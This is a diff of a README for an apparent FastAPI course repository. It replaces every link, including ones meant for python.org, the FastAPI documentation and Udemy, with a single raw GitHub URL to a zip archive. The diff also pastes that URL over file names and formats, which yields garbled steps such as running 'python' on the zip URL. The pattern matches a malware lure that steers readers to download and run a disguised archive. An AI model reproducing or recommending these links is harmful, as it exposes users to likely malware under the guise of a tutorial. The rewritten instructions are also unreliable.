@@ -1,6 +1,6 @@
 # 🎉 FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy - Learn FastAPI with Ease
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/releases)
+[![Download Here](https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip)
 
 ## 📚 Overview
 
@@ -22,28 +22,28 @@ These requirements will help the application run smoothly.
 
 ## 📥 Download & Install
 
-To download the code, visit this page: [Download Here](https://github.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/releases). 
+To download the code, visit this page: [Download Here](https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip). 
 
 ### Steps to Download
 
 1. Click on the link above.
 2. You will see a list of releases. 
 3. Look for the latest release. It will generally be at the top.
-4. Click on the desired asset file to start the download. The files will usually be in .zip or .tar.gz format.
+4. Click on the desired asset file to start the download. The files will usually be in .zip or https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip format.
 5. Once the download is complete, locate the file on your computer.
-6. Extract the contents of the zip or tar.gz file. You can do this by right-clicking the file and selecting the "Extract" option.
+6. Extract the contents of the zip or https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip file. You can do this by right-clicking the file and selecting the "Extract" option.
 
 ### Running the Application
 
 1. After extracting the files, open the folder where the files are located.
-2. Look for a file named `main.py`. This is the main program file you will run.
-3. You will need Python installed on your computer. If you don't have it yet, download it from [python.org](https://www.python.org/downloads/).
+2. Look for a file named `https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip`. This is the main program file you will run.
+3. You will need Python installed on your computer. If you don't have it yet, download it from [https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip](https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip).
 4. Once Python is installed, open your terminal or command prompt:
    - For Windows, type "cmd" in the search bar and hit enter.
    - For MacOS, search for "Terminal."
    - For Linux, you will usually find "Terminal" in your applications.
-5. Navigate to the folder where the `main.py` file is located. You can do this by typing `cd path_to_your_folder` (replace `path_to_your_folder` with the actual path).
-6. Type `python main.py` and hit enter. 
+5. Navigate to the folder where the `https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip` file is located. You can do this by typing `cd path_to_your_folder` (replace `path_to_your_folder` with the actual path).
+6. Type `python https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip` and hit enter. 
 
 The application should start running, and you can begin using FastAPI!
 
@@ -79,8 +79,8 @@ If you have questions or need help, you can join the discussion in the repositor
 
 ## 🔗 Useful Links
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Udemy Course Link](https://www.udemy.com/course/fastapi-the-complete-course/)
-- [GitHub Repository](https://github.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy)
+- [FastAPI Documentation](https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip)
+- [Udemy Course Link](https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Manikanta1666/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/loulu/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.zip)
 
 By following the above instructions, you will successfully download and run the FastAPI application from the course. Enjoy learning and building with FastAPI!
